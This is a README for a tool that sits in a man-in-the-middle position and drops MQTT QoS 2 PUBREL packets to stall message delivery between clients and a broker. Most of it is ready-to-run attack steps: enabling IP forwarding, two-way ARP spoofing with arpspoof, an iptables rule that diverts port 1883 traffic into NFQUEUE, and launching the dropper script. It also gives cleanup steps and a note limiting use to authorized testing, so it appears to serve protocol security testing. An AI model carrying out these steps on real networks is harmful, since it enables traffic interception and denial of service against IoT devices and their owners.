# MQTT QoS 2 `PUBREL` Dropper

This script acts as a packet handler to selectively drop MQTT `PUBREL` packets, identified by the MQTT control byte `0x60`, while allowing `PUBLISH` and `PUBREC` frames to pass.

It is designed to run from a Man-in-the-Middle (MITM) position to demonstrate a MQTT QoS 2 protocol-level deadlock condition.

---

## Overview

MQTT QoS 2 uses a four-step message delivery flow:

1. `PUBLISH`
2. `PUBREC`
3. `PUBREL`
4. `PUBCOMP`

This script targets the `PUBREL` stage of the QoS 2 flow. By dropping `PUBREL` packets in transit, the client and broker fail to complete the QoS 2 handshake, which can cause message delivery to remain incomplete or stuck depending on the implementation.

---

## Prerequisites

The script is intended to run on a Linux environment, such as Kali Linux, positioned between the MQTT client and the broker.

Install the required Python dependencies:

```bash
pip install scapy NetfilterQueue
```

The following tools are also required:

```bash
sudo apt install dsniff iptables
```

> `arpspoof` is included in the `dsniff` package.

---

## Network Configuration

Before executing the script, you must intercept the traffic and route it to an NFQUEUE so the script can inspect and manipulate packets in transit.

---

## 1. Enable IP Forwarding

Enable IP forwarding on the Linux machine:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

To verify the setting:

```bash
cat /proc/sys/net/ipv4/ip_forward
```

The output should be:

```bash
1
```

---

## 2. Initiate ARP Spoofing

Use `arpspoof` or a similar tool to poison the ARP caches and intercept traffic between the target device and the MQTT broker.

### Spoof Broker to Target

```bash
sudo arpspoof -i <interface> -t <target_ip> <broker_ip>
```

### Spoof Target to Broker

Open another terminal and run:

```bash
sudo arpspoof -i <interface> -t <broker_ip> <target_ip>
```

Replace the placeholders with the correct values:

| Placeholder | Description |
|---|---|
| `<interface>` | Network interface used for MITM, for example `eth0` or `eth1` |
| `<target_ip>` | IP address of the MQTT client or target device |
| `<broker_ip>` | IP address of the MQTT broker |

---

## 3. Configure IPtables

Redirect forwarded MQTT traffic on the default MQTT port `1883` into NFQUEUE queue number `1`.

```bash
sudo iptables -I FORWARD -p tcp --dport 1883 -j NFQUEUE --queue-num 1
```

You can verify the rule using:

```bash
sudo iptables -L FORWARD -n -v --line-numbers
```

---

## Usage

Once ARP spoofing is active and MQTT traffic is flowing through `queue-num 1`, execute the packet handler with root privileges:

```bash
sudo python3 mqtt_qos2_dropper.py
```

The script monitors the forwarded traffic, parses MQTT fixed headers, and drops packets identified as `PUBREL` frames.

Expected behavior:

- `PUBLISH` packets pass through.
- `PUBREC` packets pass through.
- `PUBREL` packets are dropped.
- QoS 2 flow does not complete successfully because `PUBCOMP` is never reached.

---

## Cleanup

After testing, clean up the iptables rule to restore normal network flow.

```bash
sudo iptables -D FORWARD -p tcp --dport 1883 -j NFQUEUE --queue-num 1
```

Disable IP forwarding if it is no longer required:

```bash
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Stop the ARP spoofing terminals using:

```bash
CTRL + C
```

---

## Notes

- Run this script only in an authorized testing environment.
- Ensure the machine running the script is correctly positioned between the MQTT client and broker.
- Confirm that MQTT traffic is using TCP port `1883`. If the broker uses a different port, update the iptables rule accordingly.
- This script is intended for controlled security testing and protocol behavior validation.
